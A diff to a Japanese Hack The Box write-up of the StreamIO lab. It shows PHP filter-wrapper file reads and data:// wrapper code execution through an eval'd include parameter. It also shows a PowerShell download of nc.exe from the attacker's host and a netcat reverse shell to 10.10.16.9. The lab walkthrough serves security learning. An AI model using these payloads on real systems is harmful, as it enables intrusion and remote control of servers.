@@ -527,7 +527,7 @@ c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1988, Words: 119, Lines: 54, Du
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_13.png">  
 しかしphpの機能であるラッパーを使用するとソースコードを確認できた
 ```sh
-└─$ curl -H "Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip" -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php' 
+└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php' 
 
 ~~~
 
@@ -539,7 +539,8 @@ c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1988, Words: 119, Lines: 54, Du
 ```
 base64デコード  
 先ほどのラッパーを使用すればどのファイルもdebugパラメータにインクルード処理されるっぽい  
-ちなみにrfiは動作しなかった
+ちなみにrfiは動作しなかった  
+また怪しいsqlコードもあるね
 ```php
 └─$ base64 -d base64_index.php 
 <?php
@@ -628,7 +629,7 @@ $handle = sqlsrv_connect('(local)',$connection);
 ## STEP 6
 step2で確認できたadmin配下のindex.phpともう一つ、master.phpのソースを確認すると
 ```sh
-└─$  curl -H "Cookie: PHPSESSID=lb933jcft3k5cr2731kas4qui" -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=master.php'
+└─$  curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=master.php'
 
 ~~~
 
@@ -752,3 +753,69 @@ echo(" ---- ERROR ---- ");
 if(!defined('included'))
         die("Only accessable through includes");
 ```
+postメソッドのincludeパラメータの値を`file_get_contents`で読み取った後、`eval`で実行されていることを確認
+```php
+<?php
+if(isset($_POST['include']))
+{
+if($_POST['include'] !== "index.php" ) 
+eval(file_get_contents($_POST['include']));
+else
+echo(" ---- ERROR ---- ");
+}
+?>
+```
+ということは、攻撃者のサーバ上にある悪性phpを読み取り・実行させることができそう  
+phpは「ivan sincek」のやつそのままパクっていいが、今回はシンブルに
+```php
+system("コマンド");
+```
+のwebshellを使う  
+ここでphp自体もラッパーを使用してhttpsリクエストに埋め込むことが可能らしい、[リンク](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-data)  
+ためしにwhoamiを実行してみると成功
+```sh
+└─$ echo 'system("whoami");' | base64
+c3lzdGVtKCJ3aG9hbWkiKTsK
+
+└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJ3aG9hbWkiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php' 
+
+~~~
+
+</form>
+streamio\yoshihide
+                </div>
+        </center>
+</body>
+</html>
+```
+nc.exeをkaliからダウンロード・実行させる
+```sh
+└─$ cp /usr/share/windows-resources/binaries/nc.exe .                        
+
+└─$ python3.13 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```sh
+└─$ echo 'system("powershell -c Invoke-Webrequest http://10.10.16.9/nc.exe -outfile nc.exe");' | base64 -w 0
+c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK
+
+└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php'
+
+└─$ echo 'system("nc.exe -e cmd 10.10.16.9 4444");' | base64 -w 0 
+c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=
+
+└─$ curl -H "Cookie: PHPSESSID=o3hnms5g60gr268v1p339h27jv" -k -d 'include=data://text/plain;base64,c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=' 'https://streamio.htb/admin/index.php?debug=master.php'
+
+```
+リバースシェル取得
+```powershell
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.129.70.54] 52458
+
+PS C:\inetpub\streamio.htb\admin> whoami
+streamio\yoshihide
+```
+
+
+## STEP 7
